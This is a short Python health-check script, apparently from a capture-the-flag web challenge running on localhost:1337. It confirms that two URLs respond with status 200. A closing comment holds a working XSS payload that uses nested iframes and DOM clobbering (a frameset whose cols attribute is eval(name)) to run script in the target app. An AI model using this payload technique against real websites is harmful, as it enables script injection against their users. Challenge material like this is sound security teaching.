#!/usr/bin/env python3

import requests

urls = ["http://localhost:1337", "http://localhost:1337/static/js/main.js"]

exit(not all([requests.get(url).status_code == 200 for url in urls]))

# payload: ["<iframe name='alert(1337)' srcdoc='<script defer src=/static/js/main.js></script><div id=container><div id=json-input>[-1]</div><div id=json-output></div><iframe name=config srcdoc=&quot;<frameset id=opts cols=eval(name)><frame name=debug></frame></frameset>\"></iframe>'>"]